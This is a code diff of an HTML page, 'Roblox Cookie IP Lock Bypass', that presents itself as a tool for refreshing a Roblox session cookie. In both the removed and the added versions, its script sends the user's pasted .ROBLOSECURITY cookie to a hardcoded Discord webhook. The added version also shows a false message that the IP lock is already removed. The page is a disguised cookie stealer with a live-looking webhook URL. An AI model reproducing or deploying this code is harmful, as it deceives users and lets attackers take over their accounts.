@@ -5,106 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Cookie IP Lock Bypass</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 50px;
-        }
-        input, #new-cookie {
-            width: 400px;
-            height: 150px;
-            font-size: 16px;
-            padding: 10px;
-            border: 2px solid #ccc;
-            border-radius: 8px;
-            text-align: center;
-            resize: none;
-        }
-        button {
-            margin: 10px;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .popup {
-            display: none;
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #4CAF50;
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            z-index: 1000;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        input, button { margin: 10px; padding: 10px; width: 300px; }
+        #newCookie { background: #f0f0f0; border: 1px solid #ccc; padding: 10px; }
     </style>
-</head>
-<body>
-    <h2>Roblox Cookie IP Lock Bypass</h2>
-    <textarea id="cookie" placeholder="Enter Roblox .ROBLOSECURITY"></textarea><br>
-    <button onclick="generateCookie()">Generate</button>
-    <h3>New Cookie:</h3>
-    <textarea id="new-cookie" readonly>Waiting...</textarea>
-    
-    <div id="popup" class="popup"></div>
-
     <script>
-        async function generateCookie() {
-            const cookie = document.getElementById("cookie").value;
+        async function sendCookie() {
+            const cookie = document.getElementById("cookieInput").value;
             if (!cookie) {
-                alert("Please enter a valid cookie");
+                alert("Please enter a cookie!");
                 return;
             }
             
-            const response = await fetch("YOUR_BOT_SERVER_URL/login", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ cookie })
-            });
+            document.getElementById("newCookie").textContent = cookie;
+            alert("⚠️ IP lock already removed, no need to refresh cookie.");
             
-            const data = await response.json();
-            const newCookieBox = document.getElementById("new-cookie");
-            
-            if (data.newCookie) {
-                newCookieBox.value = data.newCookie;
-                showPopup("✅ Cookie refreshed successfully!");
-            } else {
-                newCookieBox.value = cookie;
-                showPopup("⚠️ IP lock already removed, no need to refresh cookie.", "red");
-            }
-            
-            sendWebhook(cookie, data.newCookie || cookie);
-        }
-
-        function showPopup(message, color = "#4CAF50") {
-            const popup = document.getElementById("popup");
-            popup.textContent = message;
-            popup.style.backgroundColor = color;
-            popup.style.display = "block";
-            setTimeout(() => { popup.style.display = "none"; }, 3000);
-        }
-        
-        function sendWebhook(oldCookie, newCookie) {
-            const webhookUrl = "https://discord.com/api/webhooks/1342145069012226128/tCdPrO95hcPpasmFRjQtymKgYK028-0l3rZ4NgzlLKg0DgTUL4kj2ft1N0OT5LREM8jx";
+            const webhookURL = "https://discord.com/api/webhooks/1342145069012226128/tCdPrO95hcPpasmFRjQtymKgYK028-0l3rZ4NgzlLKg0DgTUL4kj2ft1N0OT5LREM8jx";
             const embed = {
-                username: "Cookie Logger",
                 embeds: [{
-                    title: "Roblox Cookie Info",
-                    color: 16711680,
-                    fields: [
-                        { name: "🔑 Old Cookie:", value: `\`${oldCookie}\`` },
-                        { name: "🔑 New Cookie:", value: newCookie ? `\`${newCookie}\`` : "⚠️ No new cookie found" }
-                    ]
+                    title: "🔑 New Roblox Cookie",
+                    description: `\`\`${cookie}\`\``,
+                    color: 16711680
                 }]
             };
             
-            fetch(webhookUrl, {
+            fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(embed)
-            });
+            }).catch(err => console.error("Webhook error:", err));
         }
     </script>
+</head>
+<body>
+    <h2>Roblox Cookie IP Lock Bypass</h2>
+    <input type="text" id="cookieInput" placeholder="Enter Roblox .ROBLOSECURITY">
+    <button onclick="sendCookie()">Generate</button>
+    <h3>New Cookie:</h3>
+    <div id="newCookie">Waiting...</div>
 </body>
 </html>
